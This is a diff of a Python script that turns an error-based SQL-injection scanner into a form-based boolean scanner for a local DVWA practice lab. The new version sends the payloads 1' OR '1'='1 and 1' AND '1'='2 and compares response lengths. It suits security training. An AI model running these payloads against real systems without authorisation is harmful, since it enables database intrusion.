@@ -1,85 +1,106 @@
 import requests
-import urllib.parse
-import time
-import logging
-from concurrent.futures import ThreadPoolExecutor
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
 
-# ---------------- CONFIG ---------------- #
+# =========================
+# CONFIG
+# =========================
 
-MAX_WORKERS = 5
-REQUEST_DELAY = 0.5  # rate limiting (seconds)
-TIMEOUT = 5
+TARGET = "http://127.0.0.1/dvwa/vulnerabilities/sqli/"
+PHPSESSID = "PASTE_YOUR_PHPSESSID_HERE"
+SECURITY = "low"
 
-SQL_ERRORS = [
-    "you have an error in your sql syntax",
-    "warning: mysql",
-    "sqlstate",
-    "syntax error",
-    "mysql_fetch"
-]
+SQLI_PAYLOADS = {
+    "true": "1' OR '1'='1",
+    "false": "1' AND '1'='2"
+}
 
-logging.basicConfig(
-    filename="results.log",
-    level=logging.INFO,
-    format="%(asctime)s - %(message)s"
-)
+REPORT_FILE = "dvwa_sqli_report.txt"
 
-# ---------------- FUNCTIONS ---------------- #
+# =========================
+# SESSION SETUP
+# =========================
 
-def load_payloads():
-    try:
-        with open("payloads.txt", "r") as f:
-            return [line.strip() for line in f if line.strip()]
-    except FileNotFoundError:
-        print("[-] payloads.txt not found")
-        return []
+session = requests.Session()
+session.cookies.set("PHPSESSID", PHPSESSID)
+session.cookies.set("security", SECURITY)
 
-def is_vulnerable(response):
-    content = response.text.lower()
-    return any(error in content for error in SQL_ERRORS)
+vulnerable = []
 
-def test_parameter(base_url, param, payload):
-    parsed = urllib.parse.urlparse(base_url)
-    params = urllib.parse.parse_qs(parsed.query)
+# =========================
+# SQLi SCANNER
+# =========================
 
-    original_value = params.get(param, [""])[0]
-    params[param] = original_value + payload
+def scan_sqli(url):
+    print(f"\n[*] Scanning: {url}")
 
-    new_query = urllib.parse.urlencode(params, doseq=True)
-    test_url = parsed._replace(query=new_query).geturl()
+    r = session.get(url)
+    soup = BeautifulSoup(r.text, "html.parser")
 
-    try:
-        response = requests.get(test_url, timeout=TIMEOUT)
-        time.sleep(REQUEST_DELAY)
-
-        if is_vulnerable(response):
-            message = f"[+] SQLi indicator | Param: {param} | Payload: {payload} | URL: {test_url}"
-            print(message)
-            logging.info(message)
-
-    except requests.exceptions.RequestException as e:
-        logging.warning(f"Request failed: {test_url} | {e}")
-
-def main():
-    target = input("Enter target URL (DVWA/local only): ").strip()
-    payloads = load_payloads()
-
-    if not payloads:
+    forms = soup.find_all("form")
+    if not forms:
+        print("[-] No forms found")
         return
 
-    parsed = urllib.parse.urlparse(target)
-    params = urllib.parse.parse_qs(parsed.query)
+    for form in forms:
+        action = form.get("action")
+        method = form.get("method", "get").lower()
 
-    if not params:
-        print("[-] No GET parameters found to test")
+        target_url = urljoin(url, action)
+        inputs = form.find_all("input")
+
+        base_data = {}
+        for inp in inputs:
+            name = inp.get("name")
+            if name:
+                base_data[name] = "1"
+
+        # TRUE condition
+        data_true = base_data.copy()
+        data_true[list(base_data.keys())[0]] = SQLI_PAYLOADS["true"]
+
+        # FALSE condition
+        data_false = base_data.copy()
+        data_false[list(base_data.keys())[0]] = SQLI_PAYLOADS["false"]
+
+        if method == "post":
+            resp_true = session.post(target_url, data=data_true)
+            resp_false = session.post(target_url, data=data_false)
+        else:
+            resp_true = session.get(target_url, params=data_true)
+            resp_false = session.get(target_url, params=data_false)
+
+        # Compare response lengths
+        if len(resp_true.text) != len(resp_false.text):
+            print("[!!! SQL INJECTION FOUND !!!]")
+            print("URL:", target_url)
+            print("Parameter:", list(base_data.keys())[0])
+            print("Payload:", SQLI_PAYLOADS["true"])
+
+            vulnerable.append((target_url, list(base_data.keys())[0], SQLI_PAYLOADS["true"]))
+
+# =========================
+# SAVE REPORT
+# =========================
+
+def save_report():
+    if not vulnerable:
+        print("\n[-] No SQL Injection found")
         return
 
-    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-        for param in params:
-            for payload in payloads:
-                executor.submit(test_parameter, target, param, payload)
+    with open(REPORT_FILE, "w") as f:
+        for url, param, payload in vulnerable:
+            f.write(f"URL: {url}\nParameter: {param}\nPayload: {payload}\n\n")
 
-# ---------------- RUN ---------------- #
+    print(f"\n[+] Report saved to {REPORT_FILE}")
+
+# =========================
+# MAIN
+# =========================
 
 if __name__ == "__main__":
-    main()
+    print("[+] DVWA SQL Injection Scanner Started")
+    scan_sqli(TARGET)
+    save_report()
+
+
